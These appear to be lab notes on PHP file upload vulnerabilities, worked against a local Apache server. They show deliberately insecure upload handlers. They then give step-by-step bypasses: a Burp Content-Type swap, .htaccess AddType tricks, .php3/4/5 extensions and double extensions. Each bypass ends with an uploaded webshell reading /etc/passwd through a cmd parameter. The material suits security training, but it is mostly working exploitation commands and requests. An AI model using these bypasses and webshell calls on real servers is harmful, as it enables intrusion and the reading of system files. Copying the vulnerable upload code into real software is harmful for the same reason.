File Upload Vulnerability

**********************************************************************************************************************************

Attacker abuses a file upload feature to upload malicious script
Script is executed and allows for further attacks -> webshell
Filters based on Content-Type, Extension names, Size etc.

**********************************************************************************************************************************

PHP File Upload Reference
http://www.phpforkids.com/php/php-forms-file-uploads.php

**********************************************************************************************************************************

Set the permissions

$ chmod 777 uploads/

**********************************************************************************************************************************

Error Checking

upload.php just checks for errors in the file being uploaded

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

        if($_FILES["file"]["error"])
        {
                header("Location: file.html");
                die();
        }
        else{

                echo "Name: ".$_FILES["file"]["name"];
                echo "<br>Size: ".$_FILES["file"]["size"];
                echo "<br>Temp File: ".$_FILES["file"]["tmp_name"];

                move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/".$_FILES["file"]["name"]);
        }


?>

</body>
</html>
$

Upload simple-backdoor.php
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Content Type check

Common practice to check for Content-Types
Attacker can use an intercepting proxy and change the Content-Type to what is expected

upload.php checks for errors in the file being uploaded and also the content type

$ cat upload.php
<html>
<body>

<h3>GIF Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

if ($_FILES["file"]["type"] != "image/gif") {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

In Burp
For GIF
Content-Disposition: form-data; name="file"; filename="action_back.gif"
Content-Type: image/gif

For backdoor
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php"
Content-Type: application/x-php

Change to
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php"
Content-Type: image/gif

In Browser
http://localhost/file_upload/content-type/uploads/simple-backdoor.php
http://localhost/file_upload/content-type/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Bypass Blacklist

Required Condition to Bypass
AllowOverride is turned on to ALL
allows .htaccess to work

upload.php checks for errors in the file being uploaded and file name

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$notAllowed = array(
    'php'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);


if (in_array($fileExtension, $notAllowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

In Browser
http://localhost/blacklist/file.html
Try uploading simple-backdoor.php
Please upload a GIF file

Rename the file
root@kali:/var/www/blacklist# cp /usr/share/webshells/php/simple-backdoor.php .
root@kali:/var/www/blacklist# ls
file.html  simple-backdoor.php  upload.php  uploads
root@kali:/var/www/blacklist# mv simple-backdoor.php simple-backdoor.PHP
root@kali:/var/www/blacklist# ls
file.html  simple-backdoor.PHP  upload.php  uploads
root@kali:/var/www/blacklist#

Upload successful
Try accessing the file
http://localhost/blacklist/uploads/simple-backdoor.PHP
Doesnt work

Change AllowOverride None to AllowOverride All in /etc/apache2/sites-available/default
root@kali:/var/www/blacklist# cat /etc/apache2/sites-available/default
<VirtualHost *:80>
        ServerAdmin webmaster@localhost

        DocumentRoot /var/www
        <Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log

        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel warn

        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
root@kali:/var/www/blacklist#

Restart Apache
root@kali:/var/www/blacklist# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/blacklist# cd /root/
root@kali:~# nano .htaccess
root@kali:~# cat .htaccess
AddType application/x-httpd-php PHP
root@kali:~#

Upload the .htaccess file
http://localhost/blacklist/file.html
.htaccess
root@kali:/var/www/blacklist/uploads# ls -a
.  ..  .htaccess  simple-backdoor.PHP

Now access the file
http://localhost/blacklist/uploads/simple-backdoor.PHP?cmd=cat+/etc/passwd

For other extensions
root@kali:/var/www/blacklist# mv simple-backdoor.php simple-backdoor.blah
root@kali:~# nano .htaccess
root@kali:~# cat .htaccess
AddType application/x-httpd-php blah
root@kali:~#

Upload the .htaccess file
http://localhost/blacklist/file.html
.htaccess
root@kali:/var/www/blacklist/uploads# ls -a
.  ..  .htaccess  simple-backdoor.PHP

Upload and access the file
http://localhost/blacklist/uploads/simple-backdoor.blah?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Bypassing Blacklists using PHPx

php 3/4/5 are allowed extensions and supported by default

upload.php checks for errors in the file being uploaded and file name

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$notAllowed = array(
    'php'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);


if (in_array($fileExtension, $notAllowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

root@kali:/var/www/blacklist# cat /etc/apache2/mods-available/php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_value engine Off
    </Directory>
</IfModule>
root@kali:/var/www/blacklist# cd ~
root@kali:~# ls
Desktop  Documents  php-meter.php
root@kali:~# mkdir demos
root@kali:~# cp /usr/share/webshells/php/simple-backdoor.php ~/demos/
root@kali:~# cd demos/
root@kali:~/demos# ls
simple-backdoor.php
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php3
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php4
root@kali:~/demos# ls -lah
total 20K
drwxr-xr-x  2 root root 4.0K Oct 29 01:26 .
drwxr-xr-x 20 root root 4.0K Oct 29 01:26 ..
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php3
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php4
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php5
root@kali:~/demos# ls -lah
total 24K
drwxr-xr-x  2 root root 4.0K Oct 29 01:27 .
drwxr-xr-x 20 root root 4.0K Oct 29 01:26 ..
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php3
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php4
-rw-r--r--  1 root root  328 Oct 29 01:27 simple-backdoor.php5
root@kali:~/demos#

Try uploading simple-backdoor.php but the upload files
Now try uploading simple-backdoor.php3 and it uploads successfully
http://localhost/blacklist/uploads/simple-backdoor.php3
http://localhost/blacklist/uploads/simple-backdoor.php3?cmd=cat+/etc/passwd
Now do the same for the other files.
http://localhost/blacklist/uploads/simple-backdoor.php4?cmd=cat+/etc/passwd
http://localhost/blacklist/uploads/simple-backdoor.php5?cmd=cat+/etc/passwd

No need to upload an .htaccess file like we did for the file with the blah extension

**********************************************************************************************************************************

Bypassing Whitelists using Double Extensions

upload.php checks for errors in the file, file name, extension and mime type

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$allowed = array(
    'gif'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);


if ($_FILES["file"]["type"] != "image/gif" || !in_array($fileExtension, $allowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

root@kali:~/demos# cp /usr/share/webshells/php/simple-backdoor.php .
root@kali:~/demos# ls
simple-backdoor.php
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.gif
root@kali:~/demos# ls
simple-backdoor.gif  simple-backdoor.php
root@kali:~/demos#

In Browser
http://localhost/double_extension/file.html
Upload simple-backdoor.gif
Try executing the file http://localhost/double_extension/uploads/simple-backdoor.gif
Fails

Double Extension
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php.gif
root@kali:~/demos# ls
simple-backdoor.gif  simple-backdoor.php  simple-backdoor.php.gif
root@kali:~/demos#

In Browser
http://localhost/double_extension/file.html
Upload simple-backdoor.php.gif
Try executing the file http://localhost/double_extension/uploads/simple-backdoor.gif
Fails

Making the configuration insecure
Remove the $ on line 1
root@kali:~/demos# cat /etc/apache2/mods-available/php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_value engine Off
    </Directory>
</IfModule>
root@kali:~/demos# apache2ctl restart
apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
root@kali:~/demos#

In Browser
http://localhost/double_extension/uploads/simple-backdoor.php.gif?cmd=cat+/etc/passwd

**********************************************************************************************************************************
